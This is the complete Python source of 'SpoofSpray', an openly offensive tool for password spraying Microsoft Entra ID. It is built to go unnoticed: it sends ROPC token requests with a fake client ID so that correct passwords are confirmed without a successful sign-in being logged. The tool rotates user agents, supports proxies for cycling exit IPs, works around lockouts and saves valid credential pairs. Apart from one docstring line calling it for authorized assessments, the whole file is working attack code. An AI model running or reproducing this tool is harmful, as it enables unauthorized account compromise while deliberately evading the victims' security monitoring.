#!/usr/bin/env python3
"""
SpoofSpray - stealthy Entra ID password spraying via OAuth client-ID spoofing.

Uses the ROPC (grant_type=password) flow against Entra ID's OAuth token
endpoint with a spoofed/fake client ID. Entra validates the credentials
BEFORE the client ID, so:

    valid creds + fake client id  -> AADSTS700016  (credentials correct,
                                     NO successful sign-in event logged)
    malformed client id           -> AADSTS900144  (app name/ID blank in logs)
    valid user + wrong password   -> AADSTS50126   (logged)

which lets an operator validate passwords while staying out of the
sign-in-log alerts that trip on successful authentications.

FOR AUTHORIZED SECURITY ASSESSMENTS ONLY. Spray only accounts inside
your engagement scope, with the engagement's permission, at a
conservative pace.
"""

import argparse
import difflib
import random
import re
import sys
import time
import uuid

import requests

VERSION = "1.0.0"

# oh365userfinder's colour trio: bright yellow info, bright red failures,
# bright green successes.
INFO = "\033[93;1m"
FAIL = "\033[91;1m"
OK = "\033[92;1m"
WARN = "\033[33;1m"
DEBUG = "\033[36m"
RESET = "\033[0m"

# Classification table (pwnedlabs spoof2.png + oh365userfinder's checks).
# Priority order matters: the first matching code in the response wins.
RESULT_TABLE = [
    # (aadsts code regex, result label, category: valid | invalid | info)
    (r"AADSTS700016", "VALID PASSWORD - STEALTH (no sign-in logged)", "valid"),
    (r"AADSTS50076|AADSTS50079", "VALID PASSWORD - MFA REQUIRED", "valid"),
    (r"AADSTS50055|AADSTS50144", "VALID PASSWORD - EXPIRED", "valid"),
    (r"AADSTS50053", "Account Locked!", "info"),
    (r"AADSTS50057", "Account Disabled!", "info"),
    (r"AADSTS50158", "External security challenge (location)", "info"),
    (r"AADSTS53003|AADSTS530032", "Conditional Access blocked", "info"),
    (r"AADSTS50005", "CA platform restriction", "info"),
    (r"AADSTS50034", "Invalid Account!", "invalid"),
    (r"AADSTS50126", "Invalid Credentials!", "invalid"),
    (r"AADSTS50059", "Tenant not found", "info"),
    (r"AADSTS50128|AADSTS50129|AADSTS50131", "Tenant identifier problem", "info"),
    (r"AADSTS900144", "Malformed client ID (app name blank in logs)", "info"),
    (r"AADSTS500011", "Resource principal not found", "info"),
]

# Common ROPC resource values (--list-resources).
COMMON_RESOURCES = [
    ("https://graph.microsoft.com", "Microsoft Graph"),
    ("https://graph.windows.net", "Azure AD Graph"),
    ("https://management.azure.com", "Azure Resource Manager"),
    ("https://outlook.office365.com", "Exchange Online (Outlook)"),
    ("https://outlook.office.com", "Outlook REST"),
    ("https://api.office.com/discovery/", "Office 365 Discovery"),
    ("https://manage.office.com", "Office 365 Management API"),
    ("https://api.security.microsoft.com", "Microsoft Defender"),
    ("https://graph.microsoft.net", "Graph (US Gov)"),
    ("https://api.partnercenter.microsoft.com", "Partner Center"),
]

# Well-known first-party Microsoft client IDs (--list-client-ids),
# sourced from Microsoft's public first-party application documentation:
# https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in
FIRST_PARTY_CLIENT_IDS = [
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("ab9b8c07-8f02-4f72-87fa-80105867a763", "OneDrive SyncEngine"),
    ("00b41c95-4ab0-4791-b19b-3b489847b8e4", "Office 365 Management"),
    ("4765445b-32c6-49b0-83e6-1d93765276ca", "Office 365 Management (alt)"),
    ("4345a7b9-9a63-4910-a426-35363201d503", "Office 365 (PowerShell)"),
    ("1950a258-227b-4e31-a9cf-717495945fc2", "Azure PowerShell"),
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"),
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure AD PowerShell"),
    ("9ba1a5c7-f17a-4de9-a1f1-6178c8d51223", "Microsoft Intune"),
    ("27922004-5251-4030-b22d-91ecd9a37ea4", "Outlook Mobile"),
    ("26a7ee05-5602-4d76-a7ba-eae8b7b67941", "Windows Search"),
    ("aebc6443-996d-45c2-90f0-388ff96faa56", "Azure AD Graph"),
    ("de8bc8b5-d9f9-48b1-a8ad-b748da725064", "Graph Explorer"),
    ("14d82eec-204b-4c2f-b7e8-296a70dab67e", "Microsoft Graph Command Line Tools"),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
]


def fail(message):
    """Print a clean usage error and exit - no tracebacks for the user."""
    print(f"{FAIL}[!] error: {message}{RESET}", file=sys.stderr)
    sys.exit(2)


class FriendlyParser(argparse.ArgumentParser):
    """ArgumentParser with human errors: unknown flags get a
    'did you mean' suggestion against the real options."""

    def error(self, message):
        if message.startswith("unrecognized arguments:"):
            bad = message.split(":", 1)[1].strip().split()[0].lstrip("-")
            known = []
            for action in self._actions:
                known.extend(action.option_strings)
            match = difflib.get_close_matches(bad, [o.lstrip("-") for o in known], n=1, cutoff=0.55)
            if match:
                prefix = "-" if len(match[0]) == 1 else "--"
                message = f"unknown option {bad!r} - did you mean {prefix + match[0]!r}?"
        self.print_usage(sys.stderr)
        print(f"{FAIL}[!] error: {message}{RESET}", file=sys.stderr)
        sys.exit(2)


def read_lines(path, what):
    """Read a target/password file with friendly errors."""
    try:
        with open(path, encoding="utf-8") as handle:
            lines = [line.strip() for line in handle if line.strip()]
    except FileNotFoundError:
        fail(f"{what} file '{path}' does not exist.")
    except IsADirectoryError:
        fail(f"'{path}' is a directory - {what} files must be regular files.")
    except PermissionError:
        fail(f"{what} file '{path}' cannot be read (permission denied).")
    except OSError as exc:
        fail(f"cannot read {what} file '{path}': {exc}")
    if not lines:
        fail(f"{what} file '{path}' is empty - nothing to spray.")
    return lines


def banner():
    print(
        f"{OK}\n\t ____                        __ ____                    \n"
        f"\t/ ___| _ __   ___   ___  / _|/ ___|_ __ _ __ __ _ _   _ \n"
        f"\t\\___ \\| '_ \\ / _ \\ / _ \\| |_| |   | '__| '__/ _` | | | |\n"
        f"\t ___) | |_) | (_) | (_) |  _| |___| |  | | | (_| | |_| |\n"
        f"\t|____/| .__/ \\___/ \\___/|_|  \\____|_|  |_|  \\__,_|\\__, |\n"
        f"\t      |_|                stealthy ROPC spraying     |___/\n{RESET}"
    )
    print()


def classify(response_text):
    """Map one ROPC response to a (label, category) per the spoof table."""
    for pattern, label, category in RESULT_TABLE:
        if re.search(pattern, response_text):
            return label, category
    return "Unrecognized response", "info"


def spray(tenant, username, password, client_id, resource, session, proxy,
           verbose, debug):
    import os
    endpoint = os.environ.get(
        "SPOOFSPRAY_ENDPOINT",
        f"https://login.microsoftonline.com/{tenant}/oauth2/token",
    )
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "client_id": client_id,
        "resource": resource,
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if debug:
        print(f"{DEBUG}[debug] POST {endpoint}{RESET}")
        for header, value in headers.items():
            print(f"{DEBUG}[debug]   {header}: {value}{RESET}")
        print(f"{DEBUG}[debug]   Body: {'&'.join(f'{k}={v}' for k, v in data.items())}{RESET}")

    try:
        response = session.post(endpoint, data=data, headers=headers,
                                proxies=proxies, timeout=30)
    except requests.RequestException as exc:
        return f"Request error: {exc}", "error", ""

    body = response.text.strip().replace("\n", " ")
    if len(body) > 400:
        body = body[:400] + " …"
    if debug:
        print(f"{DEBUG}[debug] {response.status_code} {response.reason} - {body}{RESET}")

    code_match = re.search(r"AADSTS\d+", response.text)
    code = code_match.group(0) if code_match else ""

    if response.status_code == 200:
        if '"access_token"' in response.text:
            return "VALID CREDENTIALS - TOKEN ISSUED", "valid", code
        return classify(response.text)[0], classify(response.text)[1], code

    label, category = classify(response.text)
    if verbose and code:
        label += f" ({code})"
    return label, category, code


def write_output(path, fmt, results, valid_only):
    """Write results to path in the requested format; valid_only keeps
    only successful authentications."""
    records = [r for r in results if r["valid"]] if valid_only else results
    try:
        if fmt == "json":
            import json
            with open(path, "w", encoding="utf-8") as out:
                json.dump(records, out, indent=2)
        elif fmt == "csv":
            import csv
            with open(path, "w", newline="", encoding="utf-8") as out:
                writer = csv.writer(out)
                writer.writerow(["account", "password", "result", "valid", "code", "time"])
                for r in records:
                    writer.writerow([r["account"], r["password"], r["result"],
                                     r["valid"], r["code"], r["time"]])
        else:
            with open(path, "w", encoding="utf-8") as out:
                for r in records:
                    if valid_only:
                        out.write(f"{r['account']}:{r['password']}\n")
                    else:
                        out.write(f"{r['account']}:{r['password']} - {r['result']}"
                                  f"{' (' + r['code'] + ')' if r['code'] else ''}\n")
    except OSError as exc:
        fail(f"cannot write output file '{path}': {exc}")
    what = "valid pairs" if valid_only else f"{len(records)} result(s)"
    print(f"{INFO}[info] {what} written to {path} ({fmt}){RESET}")


def main():
    parser = FriendlyParser(
        description="Stealthy Entra ID password spray via OAuth client-ID spoofing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "---Spray one password across a user list---\n"
            "python3 spoofspray.py -t megabigtech.onmicrosoft.com -el users.txt -p 'Spring2026!'\n\n"
            "---Target one account---\n"
            "python3 spoofspray.py -t <tenant-guid-or-domain> -u user@corp.com -p 'Spring2026!'\n\n"
            "---Spray a password list (users x passwords)---\n"
            "python3 spoofspray.py -t <tenant> -el users.txt -pl passwords.txt -v\n\n"
            "---Custom fake client ID + save only valid hits as JSON---\n"
            "python3 spoofspray.py -t <tenant> -el users.txt -p 'Spring2026!' "
            "-c 00000000-0000-0000-0000-000000000000 -o hits.json --format json --valid-only\n\n"
            "---Trace every request and response---\n"
            "python3 spoofspray.py -t <tenant> -u user@corp.com -p 'Spring2026!' --debug\n\n"
            "---Reference data---\n"
            "python3 spoofspray.py --list-resources\n"
            "python3 spoofspray.py --list-client-ids\n"
        ),
    )
    parser.add_argument("-t", "--tenant", 
                        help="Tenant GUID or domain (the {tenant} in /oauth2/token)")
    targets = parser.add_mutually_exclusive_group()
    targets.add_argument("-u", "--user", help="Single account to test")
    targets.add_argument("-el", "--elist", help="File of accounts, one per line")
    creds = parser.add_mutually_exclusive_group()
    creds.add_argument("-p", "--password", help="Password to spray (or use -pl)")
    creds.add_argument("-pl", "--plist", help="File of passwords to spray, one per line")
    parser.add_argument("-c", "--client-id", default=None,
                        help="Spoofed client ID (default: a random unregistered GUID)")
    parser.add_argument("-r", "--resource", default="https://graph.microsoft.com",
                        help="ROPC resource (default: graph)")
    parser.add_argument("-d", "--delay", type=float, default=2.0,
                        help="Seconds between requests (default: 2, keep it civil)")
    parser.add_argument("-l", "--lockout", type=int, default=15,
                        help="Minutes to pause after an Account Locked! hit (default: 15)")
    parser.add_argument("-o", "--output", help="Write results to this file")
    parser.add_argument("--format", choices=["txt", "json", "csv"], default="txt",
                        help="Output format for -o (default: txt)")
    parser.add_argument("--valid-only", action="store_true",
                        help="With -o, save only successful authentications (valid creds)")
    parser.add_argument("--debug", action="store_true",
                        help="Print every HTTP request and response as it happens")
    parser.add_argument("-x", "--proxy", help="HTTP(S) proxy for cycling exit IPs")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Append the raw AADSTS code to every result line")
    parser.add_argument("--list-resources", action="store_true",
                        help="List common ROPC resource values and exit")
    parser.add_argument("--list-client-ids", action="store_true",
                        help="List well-known first-party Microsoft client IDs and exit")
    args = parser.parse_args()

    if args.list_resources:
        banner()
        print(f"{INFO}[info] Common ROPC resource values:{RESET}")
        for resource, name in COMMON_RESOURCES:
            print(f"  {resource:<42} {name}")
        print(f"{INFO}\n[info] Pass one with -r/--resource.{RESET}")
        return

    if args.list_client_ids:
        banner()
        print(f"{INFO}[info] Well-known first-party Microsoft client IDs "
              f"(learn.microsoft.com verify-first-party-apps-sign-in):{RESET}")
        for client_id, name in FIRST_PARTY_CLIENT_IDS:
            print(f"  {client_id}  {name}")
        print(f"{INFO}\n[info] Pass one with -c/--client-id to spoof it.{RESET}")
        return

    if not args.password and not args.plist:
        parser.error("either -p/--password or -pl/--plist is required")

    if not args.tenant:
        parser.error("the following arguments are required: -t/--tenant "
                     "(or pass --list-resources / --list-client-ids)")
    if not args.user and not args.elist:
        parser.error("either -u/--user or -el/--elist is required")
    if "/" in args.tenant or " " in args.tenant:
        fail(f"tenant {args.tenant!r} looks like a URL or path - "
             "pass the tenant GUID or domain (the {tenant} part of the endpoint).")
    if args.proxy and not args.proxy.startswith(("http://", "https://")):
        fail(f"proxy {args.proxy!r} must start with http:// or https://")

    client_id = args.client_id or str(uuid.uuid4())
    banner()

    accounts = [args.user] if args.user else read_lines(args.elist, "user list")
    passwords = [args.password] if args.password else read_lines(args.plist, "password list")

    guid = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
    if not guid.match(client_id):
        print(f"{WARN}[*] note: client ID {client_id!r} is not GUID-shaped - "
              f"Entra will answer AADSTS900144 and leave the app name blank in logs.{RESET}")

    print(f"{INFO}[info] Starting SpoofSpray at {time.ctime()}{RESET}")
    print(f"{INFO}[info] Tenant: {args.tenant}{RESET}")
    print(f"{INFO}[info] Client ID: {client_id}{RESET}")
    print(f"{INFO}[info] Accounts: {len(accounts)}{RESET}")
    print(f"{INFO}[info] Passwords: {len(passwords)}{RESET}")
    if args.elist:
        print(f"{INFO}[info] User list: {args.elist}{RESET}")
    if args.plist:
        print(f"{INFO}[info] Password list: {args.plist}{RESET}")
    print(f"{INFO}[info] Resource: {args.resource}{RESET}")
    print(f"{INFO}[info] Delay: {args.delay}s  Lockout pause: {args.lockout} min{RESET}")
    if args.proxy:
        print(f"{INFO}[info] Proxy: {args.proxy}{RESET}")
    if args.output:
        print(f"{INFO}[info] Output: {args.output} ({args.format}"
              f"{', valid only' if args.valid_only else ''}){RESET}")
    if args.debug:
        print(f"{INFO}[info] Debug: showing requests and responses{RESET}")
    print()

    session = requests.Session()
    results = []
    locked = False
    for account in accounts:
        for password in passwords:
            label, category, code = spray(
                args.tenant, account, password, client_id, args.resource,
                session, args.proxy, args.verbose, args.debug)
            results.append({
                "account": account,
                "password": password,
                "result": label,
                "valid": category == "valid",
                "code": code,
                "time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            })
            line = f"{account}:{password} Result - {label}"
            if category == "valid":
                print(f"{OK}[+] {line} [+]{RESET}")
            elif category == "invalid":
                print(f"{FAIL}[-] {line} [-]{RESET}")
            elif category == "error":
                print(f"{FAIL}[!] {line} [!]{RESET}")
            else:
                print(f"{WARN}[*] {line} [*]{RESET}")
                if "Locked" in label:
                    locked = True
            time.sleep(args.delay)
        if locked:
            print(f"{INFO}[info] Account lockout detected - pausing "
                  f"{args.lockout} minute(s)...{RESET}")
            time.sleep(args.lockout * 60)
            locked = False

    hits = [r for r in results if r["valid"]]
    if args.output:
        write_output(args.output, args.format, results, args.valid_only)

    summary = ("one valid credential pair" if len(hits) == 1
               else f"{len(hits)} valid credential pair(s)")
    print(f"{INFO}\n[info] SpoofSpray discovered {summary}.{RESET}")
    print(f"{INFO}[info] Scan completed at {time.ctime()}{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{INFO}[info] Interrupted - scan stopped at {time.ctime()}{RESET}")
        sys.exit(130)
    except Exception as exc:  # safety net: never dump a raw traceback
        if "--debug" in sys.argv:
            raise
        fail(f"unexpected error: {exc} - rerun with --debug for a traceback")
